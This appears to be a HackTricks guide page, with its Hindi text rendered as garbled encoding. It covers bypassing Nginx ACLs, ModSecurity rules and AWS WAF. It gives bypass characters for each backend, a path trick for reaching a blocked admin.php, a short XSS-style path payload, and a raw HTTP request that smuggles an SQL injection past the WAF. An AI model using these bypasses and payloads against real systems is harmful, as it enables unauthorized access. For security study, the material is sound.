# рдкреНрд░реЙрдХреНрд╕реА / WAF рд╕реБрд░рдХреНрд╖рд╛ рдЕрд╡рд░реЛрдз рджреМрд░ рдХрд░реЗрдВ

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## Nginx ACL рдирд┐рдпрдореЛрдВ рдХреЛ рдкрдердирд╛рдо рдореИрдирд┐рдкреБрд▓реЗрд╢рди рдХреЗ рд╕рд╛рде рджреМрд░ рдХрд░реЗрдВ <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

рддрдХрдиреАрдХреЗрдВ [рдЗрд╕ рд╢реЛрдз рд╕реЗ](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)ред

Nginx рдирд┐рдпрдо рдЙрджрд╛рд╣рд░рдг:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
### **NodeJS - Express**

| Nginx Version | **Node.js Bypass Characters** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Nginx Version | **Flask Bypass Characters**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Version | **Spring Boot Bypass Characters** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Nginx FPM configuration:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx рдХреЛ `/admin.php` рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдЗрд╕реЗ `/admin.php/index.php` рддрдХ рдкрд╣реБрдВрдЪрдХрд░ рдЗрд╕реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### рдХреИрд╕реЗ рд░реЛрдХреЗрдВ
```plaintext
location ~* ^/admin {
deny all;
}
```
## Mod Security рдирд┐рдпрдореЛрдВ рдХреЛ рдЫрд▓рдХрд░рдирд╛ <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### рдкрде рднреНрд░рд╛рдВрддрд┐

[**рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ ModSecurity v3 (3.0.12 рддрдХ), **`REQUEST_FILENAME`** рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЛ рдЧрд▓рдд рдврдВрдЧ рд╕реЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдЬрд┐рд╕рдореЗрдВ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкрде рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдерд╛ (рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреА рд╢реБрд░реБрдЖрдд рддрдХ)ред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдкрде рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ URL рдбреАрдХреЛрдб рдХрд░рддрд╛ рдерд╛ред\
рдЗрд╕рд▓рд┐рдП, Mod Security рдореЗрдВ `http://example.com/foo%3f';alert(1);foo=` рдЬреИрд╕рд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдкрд░ рд╕рдордЭреЗрдЧрд╛ рдХрд┐ рдкрде рдХреЗрд╡рд▓ `/foo` рд╣реИ рдХреНрдпреЛрдВрдХрд┐ `%3f` рдХреЛ `?` рдореЗрдВ рдмрджрд▓ рджреЗрддрд╛ рд╣реИ рдЬреЛ URL рдкрде рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╕рд░реНрд╡рд░ рдХреЛ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рдкрде `/foo%3f';alert(1);foo=` рд╣реЛрдЧрд╛ред

рдЗрд╕ рдмрдЧ рд╕реЗ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ `REQUEST_BASENAME` рдФрд░ `PATH_INFO` рднреА рдкреНрд░рднрд╛рд╡рд┐рдд рд╣реБрдПред

Mod Security рдХреЗ рд╕рдВрд╕реНрдХрд░рдг 2 рдореЗрдВ рднреА рдХреБрдЫ рд╕рдорд╛рди рдШрдЯрдирд╛ рдШрдЯрд┐рдд рд╣реБрдИ рдереА рдЬрд┐рд╕рдиреЗ рдмреИрдХрдЕрдк рдлрд╝рд╛рдЗрд▓реНрд╕ (рдЬреИрд╕реЗ `.bak`) рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╡рд┐рд╢реЗрд╖ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЛ рд░реЛрдХрдиреЗ рд╡рд╛рд▓реА рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЫрд▓рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдереА, рдмрд╕ рдбреЙрдЯ URL рдХреЛрдбреЗрдб рдХрд░рдХреЗ `%2e` рднреЗрдЬрдХрд░, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: `https://example.com/backup%2ebak`ред

## AWS WAF ACL рдХреЛ рдЫрд▓рдХрд░рдирд╛ <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### рдЕрд╡рд┐рдХреГрдд рд╣реЗрдбрд░

[рдЗрд╕ рд╢реЛрдз](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) рдореЗрдВ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╣реИ рдХрд┐ AWS WAF рдирд┐рдпрдореЛрдВ рдХреЛ HTTP рд╣реЗрдбрд░реНрд╕ рдкрд░ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЛ рдЫрд▓рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ рдПрдХ "рдЕрд╡рд┐рдХреГрдд" рд╣реЗрдбрд░ рднреЗрдЬрдХрд░ рдЬреЛ AWS рджреНрд╡рд╛рд░рд╛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╡рд┐рд╢реНрд▓реЗрд╖рд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рд▓реЗрдХрд┐рди рдмреИрдХрдПрдВрдб рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрд░реЛрдз рднреЗрдЬрдХрд░ рдПрдХ SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХреЗ рд╕рд╛рде:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
рдпрд╣ AWS WAF рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рдордЭ рдирд╣реАрдВ рдкрд╛ рд░рд╣рд╛ рдерд╛ рдХрд┐ рдЕрдЧрд▓реА рдкрдВрдХреНрддрд┐ рд╣реЗрдбрд░ рдХреЗ рдорд╛рди рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИ рдЬрдмрдХрд┐ NODEJS рд╕рд░реНрд╡рд░ рдРрд╕рд╛ рдХрд░ рд░рд╣рд╛ рдерд╛ (рдпрд╣ рд╕реБрдзрд╛рд░рд╛ рдЧрдпрд╛ рдерд╛)ред

## рд╕рдВрджрд░реНрдн

* [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
* [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ** рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛рдП рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░реЗрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
